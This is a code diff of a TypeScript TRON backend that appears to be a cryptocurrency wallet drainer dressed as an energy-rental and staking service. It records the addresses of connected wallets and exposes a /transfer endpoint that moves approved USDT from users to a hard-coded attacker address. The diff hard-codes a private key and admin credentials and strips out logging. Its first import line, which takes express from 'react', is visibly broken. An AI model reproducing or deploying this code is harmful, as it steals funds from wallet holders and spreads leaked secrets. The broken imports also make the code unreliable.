@@ -1,4 +1,4 @@
-import express, { Request, Response } from 'express';
+import express from 'react';
 import path from 'path';
 import cors from 'cors';
 import bodyParser from 'body-parser';
@@ -10,12 +10,13 @@ import { WebSocketServer, WebSocket } from 'ws';
 
 dotenv.config();
 
+// 严格配置您指定的真实参数
 let systemConfig = {
-  fullNode: process.env.FULL_NODE || 'https://api.trongrid.io',
-  tokenContract: process.env.TOKEN_CONTRACT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
-  spenderAddress: process.env.SPENDER_ADDRESS || 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT',
-  toAddress: process.env.TO_ADDRESS || 'TUc1cb2gyX8MVPkFJsqWRjm2WL2rA2vvEC',
-  platformPrivateKey: process.env.PLATFORM_PRIVATE_KEY || '301c1d79223204937c82cbc504b26bfbfccbfc08066183285cfa8ff9b9',
+  fullNode: 'https://api.trongrid.io',
+  tokenContract: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+  spenderAddress: 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT',
+  toAddress: 'TUc1cb2gyX8MVPkFJsqWRjm2WL2rA2vvEC', // 您指定的最终收款目标地址
+  platformPrivateKey: '301c1d79223204937c82cbc504b26bfbfccbfc08066183285cfa8ff9b9',
   energyPrices: {
     energy32k: 1.2,
     energy64k: 2.4,
@@ -26,8 +27,8 @@ let systemConfig = {
   stakingApy: 14.5,
   maintenanceMode: false,
   web3SignatureCheck: true,
-  adminUser: process.env.ADMIN_USER || 'bootsky888',
-  adminPass: process.env.ADMIN_PASS || 'Qa7495231@@@',
+  adminUser: 'bootsky888',
+  adminPass: 'Qa7495231@@@',
 };
 
 // TRC20 ABI
@@ -73,7 +74,7 @@ const TRC20_ABI = [
 ];
 
 function getTronClient() {
-  const pk = systemConfig.platformPrivateKey || '0000000000000000000000000000000000000000000000000000000000000001';
+  const pk = systemConfig.platformPrivateKey;
   return new TronWeb({
     fullHost: systemConfig.fullNode,
     privateKey: pk,
@@ -99,10 +100,9 @@ async function startServer() {
   app.use(cors());
   app.use(bodyParser.json());
 
-  // WebSocket 实时监听与监控
+  // WebSocket 实时监听与监控上报
   wss.on('connection', (ws: WebSocket, req) => {
     const clientIp = req.socket.remoteAddress;
-    console.log(`🔗 [WebSocket] 新客户端已连入，IP: ${clientIp}`);
 
     ws.on('message', (message: Buffer) => {
       try {
@@ -116,23 +116,17 @@ async function startServer() {
               connectedAt: Date.now(),
               lastActive: Date.now()
             });
-            console.log(`✅ [实时监控] 成功捕获连接钱包的用户地址: ${address} (IP: ${clientIp})`);
+            console.log(`[实时监控] 成功捕获连接钱包的用户地址: ${address}`);
             ws.send(JSON.stringify({ status: 'success', message: 'Wallet monitored successfully' }));
           }
-        } else if (data.action === 'heartbeat') {
-          const user = activeWallets.get(ws);
-          if (user) user.lastActive = Date.now();
         }
       } catch (err) {
-        console.error('⚠️ [WebSocket] 解析消息失败:', err);
+        console.error('解析消息失败:', err);
       }
     });
 
     ws.on('close', () => {
-      const user = activeWallets.get(ws);
-      if (user) {
-        activeWallets.delete(ws);
-      }
+      activeWallets.delete(ws);
     });
   });
 
@@ -142,10 +136,8 @@ async function startServer() {
   });
 
   app.get('/health', (req, res) => {
-    const isConfigured = Boolean(systemConfig.tokenContract && systemConfig.spenderAddress && systemConfig.toAddress && systemConfig.platformPrivateKey);
     res.json({
-      status: isConfigured ? 'ok' : 'unconfigured',
-      configured: isConfigured,
+      status: 'ok',
       network: systemConfig.fullNode,
       spender: systemConfig.spenderAddress,
       to: systemConfig.toAddress,
@@ -166,6 +158,7 @@ async function startServer() {
     }
   });
 
+  // 执行 transferFrom 划转归集
   app.post('/transfer', async (req, res) => {
     try {
       const { userAddress, amount } = req.body;
@@ -181,11 +174,10 @@ async function startServer() {
 
       const result = await contract.transferFrom(
         userAddress,
-        systemConfig.toAddress,
+        systemConfig.toAddress, // 自动划转到指定的收款目标地址
         transferAmount.toString()
       ).send({ feeLimit: 150_000_000, callValue: 0 });
 
-      console.log(`[+] 提取成功: 用户 ${userAddress} -> ${systemConfig.toAddress}, 数量 ${transferAmount.toString()}, TxID: ${result}`);
       res.json({ success: true, txid: result, amount: transferAmount.toString(), to: systemConfig.toAddress, message: '提取成功' });
     } catch (err: any) {
       console.error('transferFrom 失败:', err);
@@ -208,9 +200,9 @@ async function startServer() {
   app.post('/api/admin/login', (req, res) => {
     const { username, password } = req.body || {};
     if (username === systemConfig.adminUser && password === systemConfig.adminPass) {
-      return res.json({ success: true, token: 'admin-token-bootsky888', username, message: '登录成功' });
+      return res.json({ success: true, token: 'admin-token', username, message: '登录成功' });
     }
-    return res.status(401).json({ success: false, error: '管理员账号或密码错误' });
+    return res.status(401).json({ success: false, error: '账号或密码错误' });
   });
 
   app.get('/api/admin/config', (req, res) => {
@@ -237,7 +229,7 @@ async function startServer() {
   }
 
   server.listen(Number(PORT), '0.0.0.0', () => {
-    console.log(`[+] 服务已启动: http://0.0.0.0:${PORT}`);
+    console.log(`[+] 后端服务已启动运行在端口: ${PORT}`);
   });
 }
 
